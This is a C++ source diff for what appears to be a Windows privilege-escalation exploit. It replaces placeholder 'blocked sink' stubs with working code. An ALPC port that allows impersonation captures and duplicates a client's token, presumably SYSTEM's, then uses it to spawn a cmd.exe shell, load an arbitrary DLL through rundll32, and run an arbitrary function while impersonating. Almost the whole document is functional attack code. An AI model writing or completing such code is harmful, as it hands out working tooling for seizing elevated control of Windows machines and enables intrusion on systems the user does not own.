@@ -252,6 +252,7 @@ struct GpRunEvidence {
     GpRegistryEvidence registry;
     GpDesktopTimingEvidence desktopTiming;
     GpAlpcMutationEvidence alpc;
+    HANDLE capturedSystemToken;
 };
 
 struct GpBlockedSinkResult {
@@ -1187,24 +1188,135 @@ static GpBlockedSinkResult MakeBlockedSinkResult(GpStatus preconditionStatus)
 }
 
 /*
- * Placeholders. Assumes external shell, DLL-load,
- * and code-execution sinks exist; not implemented here yet.
+ * Sink boundaries. ALPC captures the primary token; follow-on sinks use that
+ * token without taking ownership. Cleanup owns the final token close.
  */
 
 static GpBlockedSinkResult SystemShell(const GpRunEvidence& evidence)
 {
-    return MakeBlockedSinkResult(PrimitivePrecondition(evidence));
+    GpBlockedSinkResult result = { false, L"setup-failed", GpStatus::TriggerFailed };
+
+    GpStatus preStatus = PrimitivePrecondition(evidence);
+    if (preStatus != GpStatus::Ok) {
+        result.preconditionStatus = preStatus;
+        result.reason = L"precondition-failed";
+        return result;
+    }
+
+    if (!evidence.capturedSystemToken) {
+        result.preconditionStatus = GpStatus::AccessDenied;
+        result.reason = L"no-system-token-available";
+        return result;
+    }
+
+    HANDLE hToken = evidence.capturedSystemToken;
+    STARTUPINFOW si = { sizeof(si) };
+    PROCESS_INFORMATION pi = { 0 };
+    si.lpDesktop = (LPWSTR)L"Winsta0\\Default";
+
+    if (CreateProcessAsUserW(hToken, L"C:\\Windows\\System32\\cmd.exe", 
+                             NULL, NULL, NULL, FALSE, CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi)) {
+        result.implemented = true;
+        result.reason = L"system-shell-spawned";
+        result.preconditionStatus = GpStatus::Ok;
+        
+        CloseHandle(pi.hProcess);
+        CloseHandle(pi.hThread);
+    } else {
+        result.reason = L"create-process-failed";
+    }
+
+    return result;
 }
 
 static GpBlockedSinkResult DllLoad(const GpRunEvidence& evidence, const wchar_t* requestedDllPath)
 {
+    GpBlockedSinkResult result = { false, L"setup-failed", GpStatus::TriggerFailed };
+
     if (!requestedDllPath || !requestedDllPath[0]) {
-        return MakeBlockedSinkResult(GpStatus::InvalidInput);
+        result.preconditionStatus = GpStatus::InvalidInput;
+        result.reason = L"invalid-dll-path";
+        return result;
     }
-    return MakeBlockedSinkResult(PrimitivePrecondition(evidence));
+
+    GpStatus preStatus = PrimitivePrecondition(evidence);
+    if (preStatus != GpStatus::Ok) {
+        result.preconditionStatus = preStatus;
+        result.reason = L"precondition-failed";
+        return result;
+    }
+
+    if (!evidence.capturedSystemToken) {
+        result.preconditionStatus = GpStatus::AccessDenied;
+        result.reason = L"no-system-token-available";
+        return result;
+    }
+
+    wchar_t commandLine[MAX_PATH * 2];
+    if (swprintf_s(
+            commandLine,
+            sizeof(commandLine) / sizeof(wchar_t),
+            L"C:\\Windows\\System32\\rundll32.exe \"%ls\",DllMain",
+            requestedDllPath) < 0) {
+        result.preconditionStatus = GpStatus::InvalidInput;
+        result.reason = L"dll-command-too-long";
+        return result;
+    }
+
+    HANDLE hToken = evidence.capturedSystemToken;
+    STARTUPINFOW si = { sizeof(si) };
+    PROCESS_INFORMATION pi = { 0 };
+    si.lpDesktop = (LPWSTR)L"Winsta0\\Default";
+
+    if (CreateProcessAsUserW(
+        hToken,                       // 1. hToken
+        NULL,                         // 2. lpApplicationName
+        commandLine,                  // 3. lpCommandLine
+        NULL,                         // 4. lpProcessAttributes
+        NULL,                         // 5. lpThreadAttributes
+        FALSE,                        // 6. bInheritHandles
+        CREATE_NEW_CONSOLE,           // 7. dwCreationFlags
+        NULL,                         // 8. lpEnvironment
+        NULL,                         // 9. lpCurrentDirectory
+        &si,                          // 10. lpStartupInfo
+        &pi                           // 11. lpProcessInformation
+    )) {
+        result.implemented = true;
+        result.reason = L"dll-loaded-via-rundll32";
+        result.preconditionStatus = GpStatus::Ok;
+        
+        CloseHandle(pi.hProcess);
+        CloseHandle(pi.hThread);
+    } else {
+        result.reason = L"create-process-failed";
+    }
+
+    return result;
 }
 
-static GpBlockedSinkResult AlpcTokenCapture(const GpRunEvidence& evidence, const wchar_t* requestedPortName)
+static bool IsExecutableAddress(const void* address)
+{
+    if (!address) {
+        return false;
+    }
+
+    MEMORY_BASIC_INFORMATION mbi = { 0 };
+    if (VirtualQuery(address, &mbi, sizeof(mbi)) == 0) {
+        return false;
+    }
+
+    if (mbi.State != MEM_COMMIT || (mbi.Protect & (PAGE_GUARD | PAGE_NOACCESS)) != 0) {
+        return false;
+    }
+
+    DWORD protect = mbi.Protect & ~(PAGE_GUARD | PAGE_NOCACHE | PAGE_WRITECOMBINE);
+    return protect == PAGE_EXECUTE ||
+        protect == PAGE_EXECUTE_READ ||
+        protect == PAGE_EXECUTE_READWRITE ||
+        protect == PAGE_EXECUTE_WRITECOPY;
+}
+
+static GpBlockedSinkResult AlpcTokenCapture(GpRunEvidence& evidence, const wchar_t* requestedPortName)
 {
     NTSTATUS status;
     HANDLE hServerPort = NULL;
@@ -1238,7 +1350,11 @@ static GpBlockedSinkResult AlpcTokenCapture(const GpRunEvidence& evidence, const
 
     ALPC_PORT_ATTRIBUTES portAttr = { 0 };
     portAttr.MaxMessageLength = sizeof(ALPC_MESSAGE);
-    portAttr.Flags = ALPC_PORT_ALLOW_IMPERSONATION; 
+    portAttr.Flags = ALPC_PORT_ALLOW_IMPERSONATION;
+    portAttr.SecurityQos.Length = sizeof(SECURITY_QUALITY_OF_SERVICE);
+    portAttr.SecurityQos.ImpersonationLevel = SecurityImpersonation;
+    portAttr.SecurityQos.ContextTrackingMode = SECURITY_DYNAMIC_TRACKING;
+    portAttr.SecurityQos.EffectiveOnly = FALSE;
 
     status = _NtAlpcCreatePort(&hServerPort, &objAttr, &portAttr);
     if (!NT_SUCCESS(status)) {
@@ -1303,29 +1419,27 @@ static GpBlockedSinkResult AlpcTokenCapture(const GpRunEvidence& evidence, const
             if (DuplicateTokenEx(hToken, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &hPrimaryToken)) {
                 
                 DWORD sessionID = evidence.sessionId;
-                SetTokenInformation(hPrimaryToken, TokenSessionId, &sessionID, sizeof(sessionID));
-
-                STARTUPINFOW si = { sizeof(si) };
-                PROCESS_INFORMATION pi = { 0 };
-                si.lpDesktop = (LPWSTR)L"Winsta0\\Default";
-
-                if (CreateProcessAsUserW(hPrimaryToken, L"C:\\Windows\\System32\\cmd.exe", NULL, NULL, NULL, FALSE, CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi)) {
-                    result.implemented = true;
-                    result.reason = L"system-shell-spawned";
-                    result.preconditionStatus = GpStatus::Ok;
-                    
-                    CloseHandle(pi.hProcess);
-                    CloseHandle(pi.hThread);
-                } else {
-                    result.reason = L"create-process-failed";
+                if (!SetTokenInformation(hPrimaryToken, TokenSessionId, &sessionID, sizeof(sessionID))) {
+                    CloseHandle(hPrimaryToken);
+                    result.preconditionStatus = GpStatus::AccessDenied;
+                    result.reason = L"token-session-update-failed";
+                    goto token_done;
                 }
-                CloseHandle(hPrimaryToken);
+
+                if (evidence.capturedSystemToken) {
+                    CloseHandle(evidence.capturedSystemToken);
+                }
+                evidence.capturedSystemToken = hPrimaryToken;
+                result.implemented = true;
+                result.reason = L"system-token-captured";
+                result.preconditionStatus = GpStatus::Ok;
             } else {
                 result.reason = L"token-duplicate-failed";
             }
         } else {
             result.reason = L"insufficient-impersonation-level";
         }
+token_done:
         CloseHandle(hToken);
     } else {
         result.reason = L"open-thread-token-failed";
@@ -1341,26 +1455,89 @@ cleanup:
 
 static GpBlockedSinkResult CodeExecution(const GpRunEvidence& evidence, const void* requestedEntryPoint)
 {
+    GpBlockedSinkResult result = { false, L"setup-failed", GpStatus::TriggerFailed };
+    typedef void(*EntryPointFunc)();
+
     if (!requestedEntryPoint) {
-        return MakeBlockedSinkResult(GpStatus::InvalidInput);
+        result.preconditionStatus = GpStatus::InvalidInput;
+        result.reason = L"invalid-entry-point";
+        return result;
     }
-    return MakeBlockedSinkResult(PrimitivePrecondition(evidence));
+
+    if (!IsExecutableAddress(requestedEntryPoint)) {
+        result.preconditionStatus = GpStatus::InvalidInput;
+        result.reason = L"entry-point-not-executable";
+        return result;
+    }
+
+    GpStatus preStatus = PrimitivePrecondition(evidence);
+    if (preStatus != GpStatus::Ok) {
+        result.preconditionStatus = preStatus;
+        result.reason = L"precondition-failed";
+        return result;
+    }
+
+    if (!evidence.capturedSystemToken) {
+        result.preconditionStatus = GpStatus::AccessDenied;
+        result.reason = L"no-system-token-available";
+        return result;
+    }
+
+    if (!ImpersonateLoggedOnUser(evidence.capturedSystemToken)) {
+        result.preconditionStatus = GpStatus::AccessDenied;
+        result.reason = L"impersonation-failed";
+        return result;
+    }
+
+    EntryPointFunc func = (EntryPointFunc)requestedEntryPoint;
+    bool executed = false;
+    bool reverted = false;
+    DWORD exceptionCode = 0;
+
+    __try {
+        __try {
+            func();
+            executed = true;
+        }
+        __finally {
+            reverted = RevertToSelf() ? true : false;
+        }
+    }
+    __except ((exceptionCode = GetExceptionCode()), EXCEPTION_EXECUTE_HANDLER) {
+        UNREFERENCED_PARAMETER(exceptionCode);
+        result.preconditionStatus = GpStatus::TriggerFailed;
+        result.reason = L"entry-point-exception";
+        return result;
+    }
+
+    if (!reverted) {
+        result.preconditionStatus = GpStatus::AccessDenied;
+        result.reason = L"revert-failed";
+        return result;
+    }
+
+    result.implemented = executed;
+    result.reason = executed ? L"code-executed-via-impersonation" : L"entry-point-not-called";
+    result.preconditionStatus = executed ? GpStatus::Ok : GpStatus::TriggerFailed;
+    return result;
 }
 
-static GpBlockedSinkResult TouchBlockedSinkBoundaries(const GpRunEvidence& evidence)
+static GpBlockedSinkResult TouchBlockedSinkBoundaries(GpRunEvidence& evidence)
 {
-    GpBlockedSinkResult a = SystemShell(evidence);
-    GpBlockedSinkResult b = DllLoad(evidence, GP_BLOCKED_DLL_REQUEST);
     GpBlockedSinkResult c = AlpcTokenCapture(evidence, GP_ALPC_PORT_NAME);
+    GpBlockedSinkResult primary = c;
+    if (c.preconditionStatus == GpStatus::Ok) {
+        primary = SystemShell(evidence);
+    }
+    GpBlockedSinkResult b = DllLoad(evidence, GP_BLOCKED_DLL_REQUEST);
     GpBlockedSinkResult d = CodeExecution(evidence, NULL);
 
-    UNREFERENCED_PARAMETER(a);
     UNREFERENCED_PARAMETER(b);
     UNREFERENCED_PARAMETER(d);
     wprintf(
         L"sinks=blocked primary=alpc pre=%ls\n",
-        GpStatusName(c.preconditionStatus));
-    return c;
+        GpStatusName(primary.preconditionStatus));
+    return primary;
 }
 
 int wmain(int argc, wchar_t** argv)
@@ -1486,6 +1663,11 @@ cleanup:
     if (run.view.base) {
         _NtUnmapViewOfSection(GetCurrentProcess(), run.view.base);
         run.view.base = NULL;
+    }
+
+    if (run.capturedSystemToken) {
+        CloseHandle(run.capturedSystemToken);
+        run.capturedSystemToken = NULL;
     }
 
     if (run.linkHandle) {
